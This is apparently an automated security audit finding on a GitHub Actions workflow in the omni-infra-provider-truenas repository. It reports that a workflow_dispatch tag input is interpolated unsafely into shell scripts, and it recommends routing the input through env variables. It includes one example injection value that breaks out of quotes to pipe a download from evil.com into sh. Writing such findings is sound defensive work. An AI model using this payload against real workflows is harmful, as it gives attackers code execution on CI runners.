# [MEDIUM] Script injection via workflow_dispatch input.tag interpolated into run blocks

**File:** [`.github/workflows/release-dry-run.yaml`](https://github.com/bearbinary/omni-infra-provider-truenas/blob/main/.github/workflows/release-dry-run.yaml#L40-L132) (lines 40, 41, 44, 54, 63, 124, 125, 126, 127, 128, 132)
**Project:** omni-infra-provider-truenas
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `other-workflow-script-injection`

## Owners

**Suggested assignee:** `43915749+Cliftonz@users.noreply.github.com` _(via last-committer)_

## Finding

The `tag` workflow_dispatch input is rendered directly into shell `run:` scripts via `${{ inputs.tag }}` and `${{ steps.testtag.outputs.tag }}` (which itself is derived from inputs.tag). GitHub Actions performs string substitution before the shell parses the script, so a tag value like `v0.0.0";curl evil.com|sh;"` breaks out of the surrounding quotes and runs arbitrary commands on the runner. Workflow_dispatch requires repo write permission, so the attacker must already be authenticated, but a compromised contributor account or stolen PAT could pivot this into RCE on the GHA runner with whatever GITHUB_TOKEN scope the workflow grants. Affected interpolations: L40-41, L44, L54, L63, L124-128, L132. The dry-run workflow only has `contents: read`, so impact is bounded — primarily a foothold for further attack rather than direct release tampering, but the pattern is unsafe and inconsistent with the SHA-pinning hygiene elsewhere.

## Recommendation

Pass user-controlled inputs through `env:` to shell variables instead of direct interpolation: `env: { TAG: ${{ inputs.tag }} }` then `TAG="$TAG"` in the script. The shell variable is parsed safely; the GitHub-rendered expression no longer participates in shell tokenization. Apply the same to `steps.testtag.outputs.tag` consumers.

## Recent committers (`git log`)

- Zac Clifton <43915749+Cliftonz@users.noreply.github.com> (2026-04-27)
